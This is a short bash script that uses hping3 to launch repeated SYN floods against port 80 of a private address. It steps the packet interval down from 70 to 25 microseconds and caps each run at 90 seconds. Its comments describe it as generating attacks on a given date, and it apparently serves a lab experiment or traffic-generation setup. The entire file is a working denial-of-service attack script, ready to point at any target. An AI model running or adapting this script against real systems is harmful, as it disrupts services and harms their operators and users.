#!/bin/bash

# This script generates SYN floods using hping3
# For attacks ran on Saturday, 4/05/19

for ((i=70;i>20;i-=5)); do
        echo "sending SYN flood..." $i "microseconds between packets"
        # run command with 90 second timeout

        ( hping3 -q -i u$i -c 100000000 -S -p 80 -d 1200 10.40.1.1) & pid=$!
        ( sleep 90 && kill -HUP $pid ) 2>/dev/null & watcher=$!
        if wait $pid 2>/dev/null; then
                echo "your_command finished"
                pkill -HUP -P $watcher
                wait $watcher
        else
                echo "your_command interrupted"
        fi

done
